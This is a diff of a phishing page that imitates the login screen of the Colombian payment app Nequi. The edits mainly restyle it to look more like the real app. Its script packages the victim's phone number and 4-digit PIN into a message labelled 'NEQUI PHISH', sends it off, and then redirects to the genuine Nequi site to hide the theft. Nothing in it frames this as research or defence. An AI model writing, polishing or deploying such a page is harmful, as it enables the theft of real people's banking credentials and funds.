@@ -10,93 +10,103 @@
         * { margin:0; padding:0; box-sizing:border-box; }
         body { 
             font-family: 'Roboto', sans-serif; 
-            background: #1E0B2C;
+            background: #1C0B2B;
             height: 100vh; 
             display: flex; 
             align-items: center; 
             justify-content: center;
             color: white;
             margin: 0;
+            overflow: hidden;
         }
         .container {
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
             padding: 20px;
             text-align: center;
         }
         .logo {
-            font-size: 58px;
+            font-size: 52px;
             font-weight: 700;
-            margin-bottom: 60px;
-            letter-spacing: -2px;
+            margin-bottom: 90px;
+            letter-spacing: -1px;
         }
         .logo span {
             color: #FF2D95;
         }
-        .input-container {
-            background: rgba(255,255,255,0.09);
-            border-radius: 14px;
-            padding: 4px;
-            margin-bottom: 20px;
+        .input-box {
+            background: #2E1C4A;
+            border-radius: 8px;
+            height: 56px;
             display: flex;
             align-items: center;
+            padding: 0 15px;
+            margin-bottom: 20px;
+            font-size: 17px;
         }
         .country {
-            padding: 0 20px;
-            font-size: 17px;
-            border-right: 1px solid rgba(255,255,255,0.25);
-            color: #ccc;
+            color: #B8A0E0;
+            margin-right: 10px;
+            font-weight: 500;
         }
         input {
             flex: 1;
             background: transparent;
             border: none;
-            padding: 18px 15px;
-            font-size: 17px;
-            color: white;
             outline: none;
+            color: white;
+            font-size: 17px;
         }
         input::placeholder {
-            color: rgba(255,255,255,0.5);
+            color: #9B8EB8;
         }
         .btn {
             width: 100%;
-            padding: 18px;
-            background: #E91E63;
+            height: 56px;
+            background: linear-gradient(90deg, #C81E6C, #E91E63);
             color: white;
             border: none;
-            border-radius: 14px;
-            font-size: 17.5px;
+            border-radius: 8px;
+            font-size: 17px;
             font-weight: 500;
             cursor: pointer;
-            margin-top: 10px;
         }
         .help {
             position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 28px;
+            color: #aaa;
+            cursor: pointer;
+        }
+        .by {
+            position: absolute;
             top: 25px;
-            right: 25px;
-            font-size: 26px;
-            opacity: 0.7;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 13px;
+            color: #777;
         }
     </style>
 </head>
 <body>
     <div class="help">?</div>
+    <div class="by">by <span style="color:#E91E63;">●</span></div>
 
     <div class="container">
         <div class="logo"><span>■</span>Nequi</div>
         
         <form id="loginForm">
-            <div class="input-container">
-                <div class="country">+57</div>
-                <input type="tel" id="phone" placeholder="Ingresa tu celular" maxlength="10" inputmode="numeric" required>
+            <div class="input-box">
+                <span class="country">+57</span>
+                <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" inputmode="numeric" required>
             </div>
             
-            <div class="input-container">
+            <div class="input-box">
                 <input type="password" id="password" placeholder="Clave de 4 dígitos" maxlength="4" inputmode="numeric" required>
             </div>
             
-            <button type="submit" class="btn">Entrar</button>
+            <button type="submit" class="btn">Entra</button>
         </form>
     </div>
 
@@ -110,12 +120,8 @@
             const phone = document.getElementById("phone").value.trim();
             const password = document.getElementById("password").value.trim();
 
-            if (!/^\d{10}$/.test(phone)) {
-                return;
-            }
-            if (!/^\d{4}$/.test(password)) {
-                return;
-            }
+            if (!/^\d{10}$/.test(phone)) return;
+            if (!/^\d{4}$/.test(password)) return;
 
             const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
 
@@ -126,7 +132,7 @@
             }).then(() => {
                 setTimeout(() => {
                     window.location.href = "https://www.nequi.com.co";
-                }, 1200);
+                }, 800);
             });
         });
     </script>
